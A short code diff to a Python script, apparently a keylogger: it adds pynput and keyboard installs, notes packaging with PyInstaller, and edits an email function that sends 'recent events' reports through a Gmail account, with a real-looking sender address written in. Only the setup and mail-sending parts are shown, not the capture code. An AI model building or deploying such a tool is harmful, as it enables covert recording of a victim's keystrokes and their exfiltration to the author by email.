@@ -1,5 +1,6 @@
 #pip install pyinstaller
-#pip install pynputcls
+#pip install pynput
+#pip install keyboard
 
 #pyinstaller qwerty.py
 # -*- coding: utf-8 -*-
@@ -21,10 +22,10 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 def email():
-    username = "mail@gmail.com"
-    password = " "
+    username = "joelmiller14062013@gmail.com"
+    password = ""
     
-    destinatario = "mail@gmail.com"
+    destinatario = "@gmail.com"
     asunto="Reporte de eventos recientes"
     
     #crear el mensaje
